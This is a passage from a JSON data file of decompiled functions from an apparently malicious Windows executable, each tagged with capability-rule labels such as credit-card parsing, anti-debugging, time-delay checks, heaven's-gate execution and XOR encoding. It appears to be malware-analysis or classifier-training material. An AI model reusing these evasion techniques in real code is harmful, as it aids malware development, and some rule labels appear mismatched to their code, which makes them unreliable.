CARRY4(uVar8 + 0x68086a2f, 0xffffffbf < &stack0xffffffc0);\n        uVar8 = *puVar2;\n        uVar4 = *puVar2;\n        *puVar2 = uVar4 + unaff_EBP + uVar6;\n        uVar7 = iVar10 + 'A' + (CARRY4(uVar8, unaff_EBP) || CARRY4(uVar4 + unaff_EBP, uVar6));\n        uVar11 = extraout_CX >> 8;\n        if (CARRY1(uVar7, uVar11) || uVar7 + uVar11 == '\\0') {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    fcn.00401d70(0x411474, 0x11, 0x411468, 8);\n    return;\n}\n",
        "token_count": 1528
    },
    "00402960": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004029ad)\n\nvoid __cdecl fcn.00402960(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (arg_14h != 0) {\n        do {\n            *(uVar1 + arg_10h) = *(uVar1 + arg_10h) ^ *(uVar1 % arg_ch + arg_8h);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "004029e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.004029e0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00401a60;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x411470;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 218
    },
    "00402b50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402ba0) overlaps instruction at (ram,0x00402b9f)\n// \n// WARNING: Removing unreachable block (ram,0x00402b82)\n\nbool __cdecl fcn.00402b50(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar3;\n    uint *puVar4;\n    bool bVar5;\n    uint var_314h;\n    uint var_210h;\n    uchar var_10ch;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10ch = 0;\n    bVar5 = true;\n    puVar4 = &var_10bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    var_8h = 0;\n    *(puVar4 + 2) = 0;\n    puVar2 = fcn.00404060();\n    if ((bVar5) || (!bVar5)) {\n        puVar2 = &var_10ch;\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(puVar2, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00403600();\n        arg_ch_01 = fcn.00403600();\n        arg_ch_02 = fcn.00403600();\n        fcn.00401870(arg_10h, arg_ch_00);\n        fcn.00401870(arg_8h, arg_ch_01);\n        fcn.00401870(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x411004, &var_10ch, arg_10h);\n        iVar3 = fcn.00402fe0(&var_314h);\n        if (iVar3 != 0) {\n            (*pcVar1)(&var_210h, 0x411010, &var_10ch, arg_8h);\n            iVar3 = fcn.00402fe0(&var_210h);\n            if (iVar3 != 0) {\n                (*pcVar1)(&var_210h, 0x411010, &var_10ch, arg_ch);\n                iVar3 = fcn.00402fe0(&var_210h);\n                if (iVar3 != 0) {\n                    iVar3 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar3 = var_8h;\n    } while (var_4h < 3);\n    fcn.00401870(arg_14h, 4);\n    return iVar3 != 0;\n}\n",
        "token_count": 717
    },
    "00404400": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404568) overlaps instruction at (ram,0x00404565)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00404961)\n\nvoid fcn.00404400(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint16_t uVar4;\n    char extraout_AH;\n    ushort uVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uint8_t extraout_CH;\n    uint8_t *extraout_ECX;\n    char *extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    int32_t extraout_ECX_02;\n    char *extraout_ECX_03;\n    char extraout_DL;\n    ushort extraout_DX;\n    uint16_t extraout_DX_00;\n    uint16_t extraout_DX_01;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    uint32_t unaff_EBP;\n    uint *unaff_EDI;\n    uchar *puVar8;\n    bool bVar9;\n    uint8_t uVar10;\n    uint8_t in_AF;\n    bool bVar11;\n    uchar uVar12;\n    char cVar13;\n    uint8_t in_IF;\n    bool bVar14;\n    char cVar15;\n    bool bVar16;\n    uint unaff_retaddr;\n    uint in_stack_00000010;\n    uint in_stack_ffffffbc;\n    uint in_stack_ffffffcc;\n    uint arg_14h;\n    uint uVar17;\n    int32_t arg_14h_00;\n    uint *arg_14h_01;\n    uint *puVar18;\n    \n    bVar14 = false;\n    puVar18 = unaff_EDI;\n    fcn.00401d70(0x411474, 0x11, 0x411004, 10);\n    bVar9 = false;\n    uVar6 = fcn.00401d70(0x411474, 0x11, 0x411010, 0x12);\n    if ((!bVar9) && (bVar9)) {\n        out(0xbd, uVar6);\n        return;\n    }\n    uVar6 = 0x411024;\n    fcn.00401d70(0x411474, 0x11, 0x411024, 4);\n    fcn.00401d70(0x411474, 0x11, 0x411028, 0xc);\n    fcn.00401d70(0x411474, 0x11, 0x411034, 7);\n    fcn.00401d70(0x411474, 0x11, 0x41103c, 0xb);\n    fcn.00401d70(0x411474, 0x11, 0x411048, 0xc);\n    uVar10 = false;\n    uVar17 = 0x404557;\n    uVar2 = fcn.00401d70(0x411474, 0x11, 0x411054, 8);\n    if (uVar10) goto code_r0x00404568;\n    if (!uVar10) goto code_r0x00404568;\n    unaff_EDI = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n    uVar10 = CARRY1(*extraout_ECX, uVar2);\n    *extraout_ECX = *extraout_ECX + uVar2;\n    while( true ) {\n        arg_14h = 0x40457b;\n        cVar3 = fcn.00401d70(0x411474, 0x11, uVar6, uVar17);\n        if ((uVar10) || (!uVar10)) {\n            arg_14h = 0x18;\n            in_stack_ffffffcc = 0x41106c;\n        }\n        else {\n            puVar8 = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n            unaff_EDI = puVar8 + 1;\n            uVar12 = in(extraout_DX);\n            *puVar8 = uVar12;\n            *extraout_ECX_00 = *extraout_ECX_00 + cVar3;\n        }\n        fcn.00401d70(0x411474, 0x11, in_stack_ffffffcc, arg_14h);\n        cVar3 = fcn.00401d70(0x411474, 0x11, 0x411084, 0x25);\n        cVar15 = SBORROW1(cVar3, '\\x01');\n        cVar13 = cVar3 + -1 < '\\0';\n        bVar9 = cVar3 == '\\x01';\n        uVar10 = fcn.00401d70(0x411474, 0x11, 0x4110ac, 10);\n        if ((bVar9 || cVar15 != cVar13) || (!bVar9 && cVar15 == cVar13)) break;\n        uVar10 = 9 < (uVar10 & 0xf) | in_AF;\n        in_AF = uVar10;\n        if (extraout_ECX_01 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\ncode_r0x00404568:\n        uVar17 = 0xd;\n        uVar6 = 0x41105c;\n    }\n    uVar17 = 0x4110b8;\n    uVar6 = 0x11;\n    uVar10 = fcn.00401d70(0x411474, 0x11, 0x4110b8, 0xc);\n    bVar9 = (POPCOUNT(uVar10 ^ 0xca) & 1U) == 0;\n    fcn.00401d70(0x411474, 0x11, 0x4110c4, 0xd);\n    if ((bVar9) || (arg_14h_00 = extraout_ECX_02,  !bVar9)) {\n        arg_14h_00 = 6;\n        uVar17 = 0x4110d4;\n        uVar6 = 0x11;\n    }\n    *(extraout_EDX + 6) = *(extraout_EDX + 6) + -0x68;\n    pcVar1 = extraout_EDX + 0x11;\n    *pcVar1 = *pcVar1 + (extraout_ECX_02 + 1 >> 8);\n    cVar3 = *pcVar1 < '\\0';\n    bVar9 = *pcVar1 == '\\0';\n    fcn.00401d70(0x411474, uVar6, uVar17, arg_14h_00);\n    if ((!bVar9) && (bVar9)) {\n        bVar14 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n        cVar3 = (cVar3 * -0x80 | (bVar9 & 1U) * '@' & 0x80) != 0;\n    }\n    uVar6 = 0x404669;\n    uVar7 = fcn.00401d70(0x411474, 0x11, 0x4110dc, 5);\n    if ((cVar3) || (!cVar3)) {\n        uVar6 = 0xd;\n        in_stack_ffffffbc = 0x4110e4;\n    }\n    else {\n        *extraout_ECX_03 = *extraout_ECX_03 + uVar7 + 'j' + (0x1b97f295 < uVar7);\n    }\n    fcn.00401d70(0x411474, 0x11, in_stack_ffffffbc, uVar6);\n    if ((!SCARRY4(&stack0xffffffb4, 0x40)) && (SCARRY4(&stack0xffffffb4, 0x40))) {\n        *puVar18 = in_stack_00000010;\n        return;\n    }\n    fcn.00401d70(0x411474, 0x11, 0x4110f4, 0x19);\n    fcn.00401d70(0x411474, 0x11, 0x411110, 0xf);\n    fcn.00401d70(0x411474, 0x11, 0x411120, 0xe);\n    fcn.00401d70(0x411474, 0x11, 0x411130, 0xb);\n    uVar4 = fcn.00401d70(0x411474, 0x11, 0x41113c, 0xb);\n    uVar4 = ((uVar4 & 0xff | (uVar4 >> 8) - 0x2b << 8) ^ 0x3d) + 0x7c28 ^\n            (extraout_DX_00 & 0xff | (extraout_DX_00 >> 8 | extraout_DX_00) << 8);\n    bVar9 = uVar4 < 0x4001;\n    bVar16 = SBORROW2(uVar4, 0x4001);\n    bVar11 = uVar4 == 0x4001;\n    fcn.00401d70(0x411474, 0x11, 0x411148, 0xb);\n    if ((!bVar9 && !bVar11) && (bVar9 || bVar11)) {\n        if (bVar16) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00401d70(0x411474, 0x11, 0x411154, 10);\n    fcn.00401d70(0x411474, 0x11, 0x411160, 0xc);\n    fcn.00401d70(0x411474, 0x11, 0x41116c, 0xe);\n    fcn.00401d70(0x411474, 0x11, 0x41117c, 0x11);\n    bVar9 = false;\n    puVar18 = 0x411474;\n    fcn.00401d70(0x411474, 0x11, 0x411190, 0x13);\n    if ((!bVar9) && (bVar9)) {\n        *puVar18 = unaff_retaddr;\n        return;\n    }\n    fcn.00401d70(0x411474, 0x11, 0x4111a4, 0x14);\n    fcn.00401d70(0x411474, 0x11, 0x4111b8, 0x33);\n    bVar9 = extraout_DL + '\\x15' == extraout_AH;\n    fcn.00401d70(0x411474, 0x11, 0x4111ec, 10);\n    if ((bVar9) || (!bVar9)) {\n        arg_14h_01 = 0x4;\n        puVar18 = unaff_EDI;\n    }\n    else {\n        uVar6 = in(extraout_EDX_00);\n        *unaff_EDI = uVar6;\n        puVar18 = unaff_EDI + bVar14 * -2 + 1;\n        arg_14h_01 = unaff_EDI;\n        if (&stack0xffffffe4 < 1) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    *(extraout_EDX_00 + 4) = *(extraout_EDX_00 + 4) ^ extraout_CH;\n    uVar4 = fcn.00401d70(0x411474, 0x11, 0x4111f8, arg_14h_01);\n    uVar4 = ((uVar4 & 0xff | (uVar4 >> 8) - 0x2b << 8) ^ 0x3d) + 0x7c28 ^\n            (extraout_DX_01 & 0xff | (extraout_DX_01 >> 8 | extraout_DX_01) << 8);\n    cVar13 = SBORROW2(uVar4, 0x4001);\n    cVar3 = uVar4 + 0xbfff < 0;\n    uVar12 = uVar4 == 0x4001;\n    uVar5 = fcn.00401d70(0x411474, 0x11, 0x4111fc, 5);\n    if ((cVar13 == cVar3) && (cVar13 != cVar3)) {\n        *(puVar18 | unaff_EBP) = uVar5;\n        cVar13 = '\\0';\n        cVar3 = '\\0';\n        uVar12 = uVar5 + (uVar5 >> 8) * 'y' == '\\0';\n    }\n    uVar6 = 0x40496f;\n    fcn.00401d70(0x411474, 0x11, 0x411204, 6);\n    if ((uVar12 || cVar13 != cVar3) || (!uVar12 && cVar13 == cVar3)) {\n        uVar6 = 0x2a;\n    }\n    fcn.00401d70(0x411474, 0x11, 0x411238, uVar6);\n    fcn.00401d70(0x411474, 0x11, 0x411264, 0xb);\n    return;\n}\n",
        "token_count": 3121
    },
    "00401000": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004010ba) overlaps instruction at (ram,0x004010b9)\n// \n\nuint __cdecl fcn.00401000(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    uint *unaff_ESI;\n    uint *puVar2;\n    uchar uVar3;\n    bool bVar4;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar2 = &var_20fh;\n    // [00] -r-x section size 20480 named .text\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    s = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    uVar3 = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x411004, &lpBuffer, arg_8h);\n    if ((!uVar3) && (uVar3)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00403bd0(&var_4h, &var_8h);\n    bVar4 = false;\n    fcn.00401120(var_4h);\n    if ((!bVar4) && (bVar4)) {\n        *(puVar2 + 3) = *unaff_ESI;\n        var_4h = 0x8bf84d8b;\n        var_8h = extraout_ECX;\n    }\n    iVar1 = fcn.004017b0(&s, 0x411024, var_4h, var_8h);\n    if (iVar1 != 0) {\n        fcn.00403490(&s, 0xffffffff);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 593
    },
    "004015b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004015b0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.004012f0(&var_68h, &var_4h);\n    fcn.00402960(&var_68h, var_4h, 0x407010, 0x9fe0);\n    *arg_8h = 0x407010;\n    *arg_ch = 0x9fe0;\n    return;\n}\n",
        "token_count": 256
    },
    "00401870": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401870(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "004018d0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004018d0(uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    \n    uVar1 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar2 = fcn.00405000(uVar1, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar1);\n    return uVar2;\n}\n",
        "token_count": 121
    },
    "00402030": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004020af) overlaps instruction at (ram,0x004020ad)\n// \n// WARNING: Removing unreachable block (ram,0x004020af)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00402030(int32_t *arg_8h)\n\n{\n    char *pcVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    uint *puVar8;\n    uint16_t in_ES;\n    uint *in_FS_OFFSET;\n    char cVar9;\n    char cVar10;\n    uint32_t uVar11;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    char *var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405280;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    pcVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4113d8);\n    cVar10 = '\\0';\n    cVar9 = pcVar1 < 0;\n    if (pcVar1 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    uVar11 = 0x4113e4;\n    var_44h = pcVar1;\n    uVar2 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x4113e4);\n    if ((cVar10 == cVar9) && (cVar10 != cVar9)) {\n        uVar11 = uVar11 & 0xffff0000 | in_ES;\n        pcVar7 = pcVar1 | &stack0xfffffffc;\n        pcVar1 = pcVar7 + 1;\n        *pcVar7 = uVar2;\n        uVar2 = uVar2 & 0xffff0000 | uVar2 + (uVar2 >> 8) * 'y';\n    }\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(arg_8h, uVar2, 0, 0, 2, 1000, &var_18h, uVar11);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(pcVar1, 0x4113f8);\n    if (pcVar3 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar4 = (*pcVar3)(var_18h, str._D_3, 0, &var_20h);\n    if ((iVar4 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar4 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar4 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    arg_8h = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar4 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &arg_8h);\n                    if ((iVar4 < 0) || (arg_8h == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x00402461:\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\ncode_r0x0040246d:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar4 = (***arg_8h)(arg_8h, 0x4061b0, &var_10h);\n                    if (((iVar4 < 0) || (var_10h == NULL)) ||\n                       (iVar4 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar4 < 0)) {\njoined_r0x00402428:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                        goto code_r0x0040246d;\n                    }\n                    if (pbstr == 0) {\njoined_r0x00402264:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                    }\n                    else {\n                        fcn.00401e30(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar5 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x41140c);\n                        if (iVar5 != 0) goto joined_r0x00402264;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar4 = (***arg_8h)(arg_8h, 0x4061a0, &var_14h);\n                        if ((iVar4 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x0040240d:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x00402461;\n                        }\n                        iVar4 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar5 = var_3ch;\n                        if (iVar4 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x0040240d;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar8 = &var_147h;\n                            for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n                                *puVar8 = 0;\n                                puVar8 = puVar8 + 1;\n                            }\n                            *puVar8 = 0;\n                            *(puVar8 + 2) = 0;\n                            fcn.00401e30(iVar5, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar5 = fcn.00401f60(&var_148h);\n                            if (iVar5 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x00402428;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            pcVar1 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                pcVar1 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(pcVar1);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar4;\n}\n",
        "token_count": 2735
    },
    "00402570": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004026ba) overlaps instruction at (ram,0x004026b7)\n// \n// WARNING: Removing unreachable block (ram,0x00402757)\n// WARNING: Removing unreachable block (ram,0x00402761)\n// WARNING: Removing unreachable block (ram,0x00402765)\n// WARNING: Removing unreachable block (ram,0x004026b1)\n\nint32_t __cdecl fcn.00402570(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    uint8_t extraout_CH;\n    int32_t iVar3;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint uVar4;\n    uint8_t *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint *puVar8;\n    bool bVar9;\n    uchar uVar10;\n    ulong uVar11;\n    uchar uStack612;\n    uint uStack611;\n    uint uStack385;\n    uint uStack381;\n    uint uStack377;\n    uint uStack373;\n    uint uStack369;\n    code *pcStack365;\n    uint uStack361;\n    uint uStack357;\n    uchar auStack353 [2];\n    uchar auStack351 [6];\n    uint uStack345;\n    uint uStack341;\n    uint uStack337;\n    uchar uStack333;\n    uchar uStack332;\n    ushort uStack331;\n    int32_t iStack329;\n    uchar *puStack325;\n    uchar *puStack321;\n    uchar uStack317;\n    uchar uStack316;\n    ushort uStack315;\n    uchar uStack313;\n    uchar uStack312;\n    ushort uStack311;\n    uchar uStack309;\n    uchar uStack308;\n    ushort uStack307;\n    uchar uStack305;\n    uchar uStack304;\n    ushort uStack303;\n    uchar uStack301;\n    uchar uStack300;\n    uchar uStack299;\n    uchar uStack298;\n    uchar uStack297;\n    int32_t iStack296;\n    uchar *puStack292;\n    uint uStack288;\n    int32_t iStack284;\n    uint *puStack280;\n    uchar var_108h;\n    uint var_107h;\n    uint auStack92 [11];\n    uint uStack48;\n    ushort uStack44;\n    int32_t iStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    int32_t var_4h;\n    \n    puStack280 = &fcn.00402570::var_4h;\n    iStack284 = arg_8h;\n    uStack288 = 0x4025a9;\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)();\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar6 = &fcn.00402570::var_107h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    puStack292 = &stack0xfffffef4;\n    uStack288 = 0x104;\n    iStack296 = arg_8h;\n    puVar7 = puVar6 + 3;\n    *(puVar6 + 2) = 0;\n    uStack300 = 0xec;\n    uStack299 = 0x25;\n    uStack298 = 0x40;\n    uStack297 = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)();\n    uStack300 = 0xb4;\n    uStack299 = 0x13;\n    uStack298 = 0x41;\n    uStack297 = 0;\n    uStack304 = SUB41(&stack0xfffffef4, 0);\n    uStack303 = &stack0xfffffef4 >> 8;\n    uStack301 = &stack0xfffffef4 >> 0x18;\n    uStack308 = 10;\n    uStack307 = 0x4026;\n  